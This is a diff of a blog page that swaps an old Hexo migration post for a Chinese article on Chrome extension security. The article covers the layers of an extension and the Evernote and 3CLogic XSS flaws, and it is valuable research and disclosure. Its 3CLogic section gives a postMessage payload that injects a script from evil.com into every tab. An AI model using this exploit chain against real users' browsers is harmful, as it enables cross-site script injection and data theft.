@@ -20,24 +20,38 @@
     <meta name="keywords" content="LoRexxar,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="前两天突然国内的gitcafe被coding收购了，好像到5月底就会停止供应，那没办法，就需要移植下hexo博客了，稍微研究了下配置，更改还是比较简单的…">
+    <meta name="description" content="在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge Dev浏览器，并提供了兼容Chrome Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。 在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hexo转移到coding配置">
-<meta property="og:url" content="https://lorexxar.cn/2016/03/05/hexo-coding/index.html">
+<meta property="og:title" content="从0开始入门Chrome Ext安全（三） -- 你所未知的角落 -  Chrome Ext安全">
+<meta property="og:url" content="https://lorexxar.cn/2021/08/17/chrome-ext-4/index.html">
 <meta property="og:site_name" content="LoRexxar&#39;s Blog">
-<meta property="og:description" content="前两天突然国内的gitcafe被coding收购了，好像到5月底就会停止供应，那没办法，就需要移植下hexo博客了，稍微研究了下配置，更改还是比较简单的…">
-<meta property="article:published_time" content="2016-03-05T10:39:21.000Z">
-<meta property="article:modified_time" content="2016-03-14T11:43:02.000Z">
+<meta property="og:description" content="在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge Dev浏览器，并提供了兼容Chrome Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。 在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144441.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144504.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150148.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144550.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144635.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817154421.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150724.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817165337.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817171906.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173051.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173426.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173541.png">
+<meta property="og:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173658.png">
+<meta property="article:published_time" content="2021-08-17T06:41:47.000Z">
+<meta property="article:modified_time" content="2021-08-17T09:57:48.621Z">
 <meta property="article:author" content="LoRexxar">
-<meta property="article:tag" content="Blogs">
-<meta property="article:tag" content="Hexo">
+<meta property="article:tag" content="chrome">
+<meta property="article:tag" content="chrome ext">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144441.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
     <link rel="alternate" href="/atom.xml" title="LoRexxar&#39;s Blog" type="application/atom+xml">
     
-    <title>hexo转移到coding配置 · LoRexxar&#39;s Blog</title>
+    <title>从0开始入门Chrome Ext安全（三） -- 你所未知的角落 -  Chrome Ext安全 · LoRexxar&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -253,7 +267,7 @@
                 <a href="/" >LoRexxar&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">hexo转移到coding配置</a>
+                <a href="#" class="post-name">从0开始入门Chrome Ext安全（三） -- 你所未知的角落 -  Chrome Ext安全</a>
             </div>
     </div>
     
@@ -283,7 +297,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            hexo转移到coding配置
+            从0开始入门Chrome Ext安全（三） -- 你所未知的角落 -  Chrome Ext安全
             <!-- 404 -->
             
         </h1>
@@ -302,20 +316,20 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Blogs">Blogs</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "chrome">chrome</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Hexo">Hexo</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "chrome ext">chrome ext</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">131</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2016/03/05</span>
+                    <span class="post-intro-time">2021/08/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -439,24 +453,141 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>前两天突然国内的gitcafe被coding收购了，好像到5月底就会停止供应，那没办法，就需要移植下hexo博客了，稍微研究了下配置，更改还是比较简单的…</p>
+        <p>在2019年初，微软正式选择了Chromium作为默认浏览器，并放弃edge的发展。并在19年4月8日，Edge正式放出了基于Chromium开发的Edge Dev浏览器，并提供了兼容Chrome Ext的配套插件管理。再加上国内的大小国产浏览器大多都是基于Chromium开发的，Chrome的插件体系越来越影响着广大的人群。</p>
+<p>在这种背景下，Chrome Ext的安全问题也应该受到应有的关注，《从0开始入门Chrome Ext安全》就会从最基础的插件开发开始，逐步研究插件本身的恶意安全问题，恶意网页如何利用插件漏洞攻击浏览器等各种视角下的安全问题。</p>
+<ul>
+<li><a href="https://lorexxar.cn/2019/11/22/chrome-ext-1/">从0开始入门Chrome Ext安全（一） – 了解一个Chrome Ext</a></li>
+<li><a href="https://lorexxar.cn/2019/12/05/chrome-ext-2/">从0开始入门Chrome Ext安全（二） – 安全的Chrome Ext</a></li>
+</ul>
+<p>在经历了前两篇之后，我们把视角重新转换，把受害者的目标从使用插件者换到插件本身。对于Chrome ext本身来说，他会有什么样的问题呢？</p>
+<p>PS: 当时这份研究是在2020年初做的，当时还在知道创宇的404实验室，感觉内容很有趣所以准备拿去当议题。2020年我想大家都懂的，很多会议都取消了，一拖就拖到2021年，本来打算拿去投KCON，但是没有通过。所以今天就整理整理发出来了~</p>
 <a id="more"></a>
 
-<h1 id="注册coding"><a href="#注册coding" class="headerlink" title="注册coding"></a>注册coding</h1><p><a href="https://coding.net" target="_blank" rel="noopener">https://coding.net</a></p>
-<h1 id="添加公钥"><a href="#添加公钥" class="headerlink" title="添加公钥"></a>添加公钥</h1><p>注册过github gitcafe的应该不陌生，打开~/.ssh/id_rsa.pub复制粘贴。<br>等一会儿就可以了。</p>
-<h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>修改根目录的_config.yml</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">repository</span>: git<span class="variable">@git</span>.coding.<span class="attribute">net</span>:LoRexxar/LoRexxar.git</span><br><span class="line">  <span class="attribute">branch</span>: coding-pages</span><br></pre></td></tr></table></figure>
+<h1 id="从一个真实事件开始"><a href="#从一个真实事件开始" class="headerlink" title="从一个真实事件开始"></a>从一个真实事件开始</h1><p>在evernote扩展中曾爆出过一个xss漏洞</p>
+<ul>
+<li><a href="https://guard.io/blog/evernote-universal-xss-vulnerability" target="_blank" rel="noopener">Critical Vulnerability Discovered in Evernote’s Chrome Extension</a></li>
+</ul>
+<p>首先我们从manifest开始，存在问题的js是content js.</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144441.png" alt="image.png-17.1kB"></p>
+<p>BrowserFrameLoader.js会被直接插入到http、https、ftp三个域内，由于all_frames，还会被直接插入到页面内的每一个iframe子框架下。</p>
+<p>其中有这么一段代码比较关键</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144504.png" alt="image.png-27.8kB"></p>
+<p>这段代码主要通过函数<code>_getBundleUrl</code>来生成要安装的js地址，而其中的e来自于resourcePath参数，这里本身应该通过传入形如<code>chrome-extension://...</code>这样的路径，以生成所需要的js路径。</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150148.png" alt="image-20210817150115998"></p>
+<p>可以看到<code>_getBundleUrl</code>中本身也没有验证，所以只要我们传入resourcePath为恶意地址，我们就可以通过这个功能把原本的js替换到，改为我们想要注册的js。</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144550.png" alt="image.png-25.4kB"></p>
+<p>我们可以直接通过window.postMessage与后端沟通，传递消息。</p>
+<p>再配合manifest中的all_frames，我们可以通过在某个页面中构造一个隐藏的iframe标签，其中使用window.postMessage传递恶意地址，导致其他页面引入恶意的js。</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817144635.png" alt="image.png-81.1kB"></p>
+<p>这样一来，如果带有这个插件的浏览者访问某个页面时，就会直接被大范围的攻击，那么这个漏洞的具体原理是什么样的呢？</p>
+<h1 id="浏览器插件安全逻辑"><a href="#浏览器插件安全逻辑" class="headerlink" title="浏览器插件安全逻辑"></a>浏览器插件安全逻辑</h1><p>在研究插件的漏洞之前，首先我们需要从插件的结构和可以攻击的方式来思考。</p>
+<p><a href="https://lorexxar.cn/2019/11/22/chrome-ext-1/">从0开始入门Chrome Ext安全（一） – 了解一个Chrome Ext</a></p>
+<p>在第一篇文章中，我们曾详细的描述过和chrome有关的诸多信息，其中有很重要的一部分是插件不同层级之间的通信方式，我们把这个结构画出来大概是这样的:</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817154421.png" alt="image-20210817150301320"></p>
+<p>首先我们把插件的结构体系分为三级，分别是Web层、content层、bg层。</p>
+<p>其中插件的<strong>web层</strong>主要是<code>injected script</code>，在这部分中，主要漏洞就围绕js本身，原理上和普通的js漏洞没什么区别，这里就不深入讨论。</p>
+<p>而<strong>content层</strong>中，这部分和Web层主要的区别是它可以访问很小一部分chrome api，其中最重要的是，它可以和bg层进行沟通。抛开本身js漏洞不谈，content层最大的特殊就在于它是一个中转层，只有content构造的<code>chrome.runtime.sendMessage</code>可以向后端传递数据。</p>
+<p>在<strong>bg层</strong>中，就涉及到了许多的敏感操作了，一旦可以控制bg层中的代码执行，我们几乎相当于控制了整个浏览器，但其中最大的限制仍然是，我们没办法直接操作bg层，浏览器想要操作bg层，就必须通过content层来中转。</p>
+<table>
+<thead>
+<tr>
+<th>-</th>
+<th>js执行</th>
+<th>可控点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web层</td>
+<td>和普通js没有区别</td>
+<td></td>
+</tr>
+<tr>
+<td>content层</td>
+<td>除了普通js以外只能访问runtime等少部分api</td>
+<td>只能通过addEventListener或获取dom输入</td>
+</tr>
+<tr>
+<td>bg层</td>
+<td>可以访问大部分api，但不能访问页面dom</td>
+<td>只能通过runtime.onmessage.addListener获取输入</td>
+</tr>
+</tbody></table>
+<p>当我们在了解了chrome插件结构之后，不难发现，<strong>当我们想要利用一个插件漏洞时，首先我们必须从可控出发.</strong></p>
+<p>当我们可以控制某个敏感操作的一部分时，我们就有可能构造一次利用，一次完整的利用链就构造成功了。</p>
+<p>而对于浏览器来说，符合正常人的逻辑的交互逻辑即为访问某个链接，或者访问某个页面。</p>
+<p><strong>建立在这个基础上，通过构造恶意网页、链接，诱导受害人点击，从而开始进行一系列攻击行为则是对于插件安全漏洞的正确利用方向。</strong></p>
+<p>而通过访问某个恶意页面配合插件的某个漏洞攻击，只有两个维度可以供我们攻击，在这里我们把这两种攻击方式分为两个维度，<strong>基于Content层的安全问题</strong>和<strong>基于bg层的安全问题</strong>。</p>
+<p>在下面我们就将围绕这两个维度来讲述。</p>
+<h1 id="基于content-script的安全问题"><a href="#基于content-script的安全问题" class="headerlink" title="基于content script的安全问题"></a>基于content script的安全问题</h1><p>在前面的篇幅中我曾详述过content script的相关信息，content script会把相应的js插入到符合条件的所有页面中，而这个条件会在manifest中被定义。</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"My extension"</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"content_scripts"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"matches"</span>: [<span class="string">"http://*.nytimes.com/*"</span>],</span><br><span class="line">      <span class="string">"exclude_matches"</span>: [<span class="string">"*://*/*business*"</span>],</span><br><span class="line">      <span class="string">"include_globs"</span>: [<span class="string">"*nytimes.com/???s/*"</span>],</span><br><span class="line">      <span class="string">"exclude_globs"</span>: [<span class="string">"*science*"</span>],</span><br><span class="line">      <span class="string">"all_frames"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">"js"</span>: [<span class="string">"contentScript.js"</span>],</span><br><span class="line">      <span class="string">"run_at"</span>: <span class="string">"document_idle"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>重新添加以下就好了。</p>
-<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure>
+<p>其中几个参顺相对应的配置为：</p>
+<ul>
+<li>matches: 匹配生效的域</li>
+<li>exclued_matches: 不匹配生效的域</li>
+<li>include_globs: 在前两项匹配之后生效的匹配关键字</li>
+<li>exclude_globs: 在前两项匹配之后生效的排除关键字</li>
+<li>all_frames: content script是否会插入到页面的iframe标签中</li>
+<li>run_at: 指content script插入的时机</li>
+</ul>
+<p>Content层和Web层是通过<strong>事件监听</strong>的方式沟通的：</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817150724.png" alt="image-20210817150722902"></p>
+<p>这样一来，Content层的安全问题就有了几个绕不开的特点：</p>
+<ul>
+<li>攻击者只能通过<strong>window.postMessage</strong>与后端沟通，传递消息。</li>
+<li>如果只能触发Content Script的漏洞，那么只影响当前Web Page，与<strong>XSS漏洞无异</strong>。</li>
+<li>如果开启了<strong>all_frame</strong>,配合<strong>特殊场景</strong>可以影响所有的子frame，就可以<strong>定向攻击任何域</strong>。</li>
+</ul>
+<p>Content层面的的问题因为逃不开诸多的限制，所以危害比较有限，前面的evernote的漏洞已经是非常厉害的一个漏洞了。</p>
+<ul>
+<li><a href="https://youtu.be/K6Oqb0hVT9k" target="_blank" rel="noopener">Evernote Chrome ext XSS 演示 youtube版本</a></li>
+</ul>
+<h1 id="基于bg层的安全问题"><a href="#基于bg层的安全问题" class="headerlink" title="基于bg层的安全问题"></a>基于bg层的安全问题</h1><p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817165337.png" alt="image-20210817165335661"></p>
+<p>与content层漏洞最大的区别就是，我们没办法<strong>直接和bg/popup层交互</strong>，除非本身的逻辑有安全问题。但如果能造成任意代码执行，可能可以<strong>通过chrome API威胁整个浏览器的各个方面</strong>。</p>
+<p>那么这类漏洞的关键点就在于，<strong>不管后端存不存在有问题的API，在content script层有可控的<code>chrome.tabs.sendMessage</code>信息向pop/popup script传输是这类漏洞首先必备的基础条件</strong>。</p>
+<h3 id="中转函数"><a href="#中转函数" class="headerlink" title="中转函数"></a>中转函数</h3><p>而在部分插件代码中，content script设置中转代码也并不罕见。<strong>正所谓，上有对策，下有政策。为安全性考量的而设置的限制，也实实在在的影响到了原本的插件开发者。所以开发插件的开发者也通过自己的方式来构造直接传输的通道。</strong></p>
+<p>在3CLogic Universal CTI插件中就有这样的一段代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Accept messages from this window only</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> (event.data) !== <span class="string">"string"</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// Send convert string back to object for passing it to the extension</span></span><br><span class="line">        <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(event.data);</span><br><span class="line">        <span class="comment">// adding cccce so that this message doesn't mix with messages from other windows</span></span><br><span class="line">        <span class="keyword">if</span> (data.method &amp;&amp; data.method !== <span class="string">"onCTIAdapterMessage"</span>) &#123;</span><br><span class="line">            data.method = <span class="string">`ccce<span class="subst">$&#123;data.method&#125;</span>`</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ccclogger.log(<span class="string">`Got Adaptor Message`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">window</span>.chrome.extension.sendMessage(data,</span><br><span class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                ccclogger.log(response);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ccclogger.warn(e, e.stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码会把接收到的消息通过<code>window.chrome.extension.sendMessage</code>转发出去。</p>
+<p>通过这样的代码我们就可以直接和popup/bg 层沟通，也代表我们有<strong>一定的可能</strong>构造一个利用。</p>
+<h3 id="恶意函数"><a href="#恶意函数" class="headerlink" title="恶意函数"></a>恶意函数</h3><p>反之，我们也可以从利用的角度思考，popup/bg script没办法直接和页面沟通，换言之，也就是说如果在popup/bg script中存在可以被利用的点，一定是来源于相应的恶意函数。</p>
+<p>而其中相应的恶意函数只有几个，分别是：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chrome</span><span class="selector-class">.tabs</span><span class="selector-class">.executeScript</span></span><br><span class="line"><span class="selector-tag">chrome</span><span class="selector-class">.tabs</span><span class="selector-class">.update</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">eval</span></span><br><span class="line"><span class="selector-tag">setTimeout</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>executeScript</strong>可以在任意页面执行代码，而<strong>update函数</strong>可以更新页面中的信息，包括url等，<strong>eval和setTimeout可以执行插件代码</strong>，但也同样会被可能会受到CSP的限制。</p>
+<p>从利用的角度来讲，只有popup/bg script存在这样的函数，并且参数可控，那么才有可能诞生一个漏洞。</p>
+<h3 id="举个栗子-3CLogic-Universal-CTI-XSS"><a href="#举个栗子-3CLogic-Universal-CTI-XSS" class="headerlink" title="举个栗子 - 3CLogic Universal CTI XSS"></a>举个栗子 - 3CLogic Universal CTI XSS</h3><p>首先根据manifest的内容可以知道，这个插件可以通过构造的方式生效在任意域下。</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817171906.png" alt="image-20210817171905056"></p>
+<p>Content层也存在可控的中转函数</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173051.png" alt="image-20210817173049880"></p>
+<p>Bg层接收到消息之后，触发processMessage函数</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173426.png" alt="image-20210817173424538"></p>
+<p>processMessage函数根据传入的操作类型转到相应的接口。其中就包含可以给任意tag插入js的sendInjectEvent函数</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173541.png" alt="image-20210817173539993"></p>
+<p>sendInjectEvent会将传入的参数拼接到函数内，并通过创建标签的方式为指定的tag新建标签。</p>
+<p><img src="https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/20210817173658.png" alt="image-20210817173656585"></p>
+<p>整个利用链被链接起来，简化为：</p>
+<p>1、构造恶意页面在<code>“*://*/*3cphone.html*”</code>，受害者访问该页面/将链接植入到某个点击劫持/URL跳转/。<br>2、打开其他目标页面如微博、twitter等。<br>3、恶意页面发送</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">window</span><span class="selector-class">.postMessage</span>(JSON.stringify(&#123;</span><br><span class="line">	“method”: “OnInjectScript”,</span><br><span class="line">	“forSite”: “.”, </span><br><span class="line">	“selectedLibs": [</span><br><span class="line">		<span class="attribute">https</span>:<span class="comment">//evil.com/evil.js</span></span><br><span class="line">	]&#125;), <span class="string">"*"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>4、恶意JS被插入到所有的tag中，我们就可以在任意目标域执行JS，如获取微博消息等。</p>
+<ul>
+<li><a href="https://youtu.be/t4HG7K_JIVg" target="_blank" rel="noopener">3CL Chrome ext XSS 演示 youtube版本</a></li>
+</ul>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>其实可以把整个漏洞分成两部分，寻找中转函数和寻找恶意函数，如果找到满足两个同时条件的情况，再辅以一些人工基本上就能找到一个漏洞。当时也是把这个思路贯彻到KunLun-M上，我会利用工具寻找两个条件的代码，然后做人工审计，当时还是发现了一些漏洞的，后来觉得挖掘需要一定的成本，而且我也没打算拿来作恶，所以这些漏洞也就用不太上，于是后来打算拿出来当议题。（3CL这个漏洞是我挖掘的通用性最高的，同时危害也不算太大）</p>
+<p>当时这份研究是在2020年初做的，当时还在知道创宇的404实验室，感觉内容很有趣所以准备拿去当议题。2020年我想大家都懂的，很多会议都取消了，一拖就拖到2021年，本来打算拿去投KCON，但是没有通过。有趣的是在DEFCON2021的一个议题中，提到了差不多的内容。</p>
+<p><a href="https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Barak%20Sternberg%20-%20Extension-Land%20-%20%20exploits%20and%20rootkits%20in%20your%20browser%20extensions.pdf" target="_blank" rel="noopener">Barak Sternberg - Extension-Land - exploits and rootkits in your browser extensions</a></p>
+<p>除了我的部分内容以外呢，他还提了几个不算太常见的攻击场景，感兴趣可以去看看（但我感觉他把一个简单的东西讲复杂了，这违背了的行文意愿）。因为这个我也没兴趣继续保留这份成果了，今天也公开出来，其中可能有很多老的东西。但是其实也很少有系统的分享插件安全思路的文章，希望这篇文章可以给你带来收获。</p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://lorexxar.cn">LoRexxar</a>
-            <p>原文链接：<a href="https://lorexxar.cn/2016/03/05/hexo-coding/">https://lorexxar.cn/2016/03/05/hexo-coding/</a>
-            <p>发表日期：<a href="https://lorexxar.cn/2016/03/05/hexo-coding/">March 5th 2016, 6:39:21 pm</a>
-            <p>更新日期：<a href="https://lorexxar.cn/2016/03/05/hexo-coding/">March 14th 2016, 7:43:02 pm</a>
+            <p>原文链接：<a href="https://lorexxar.cn/2021/08/17/chrome-ext-4/">https://lorexxar.cn/2021/08/17/chrome-ext-4/</a>
+            <p>发表日期：<a href="https://lorexxar.cn/2021/08/17/chrome-ext-4/">August 17th 2021, 2:41:47 pm</a>
+            <p>更新日期：<a href="https://lorexxar.cn/2021/08/17/chrome-ext-4/">August 17th 2021, 5:57:48 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -464,17 +595,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2016/03/07/bkp2016-writeup/" title= "bkp2016_writeup">
-                    <div class="nextTitle">bkp2016_writeup</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2016/03/01/ssctf2015-writeup/" title= "ssctf2015_writeup">
-                    <div class="prevTitle">ssctf2015_writeup</div>
+                <a href= "/2021/08/17/devsecops/" title= "DevSecOps 究竟需要怎样的白盒？">
+                    <div class="prevTitle">DevSecOps 究竟需要怎样的白盒？</div>
                 </a>
             
         </li>
@@ -578,7 +704,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#注册coding"><span class="toc-number">1.</span> <span class="toc-text">注册coding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#添加公钥"><span class="toc-number">2.</span> <span class="toc-text">添加公钥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#修改配置"><span class="toc-number">3.</span> <span class="toc-text">修改配置</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#从一个真实事件开始"><span class="toc-number">1.</span> <span class="toc-text">从一个真实事件开始</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#浏览器插件安全逻辑"><span class="toc-number">2.</span> <span class="toc-text">浏览器插件安全逻辑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基于content-script的安全问题"><span class="toc-number">3.</span> <span class="toc-text">基于content script的安全问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#基于bg层的安全问题"><span class="toc-number">4.</span> <span class="toc-text">基于bg层的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#中转函数"><span class="toc-number">4.0.1.</span> <span class="toc-text">中转函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#恶意函数"><span class="toc-number">4.0.2.</span> <span class="toc-text">恶意函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#举个栗子-3CLogic-Universal-CTI-XSS"><span class="toc-number">4.0.3.</span> <span class="toc-text">举个栗子 - 3CLogic Universal CTI XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在最后"><span class="toc-number">4.1.</span> <span class="toc-text">写在最后</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
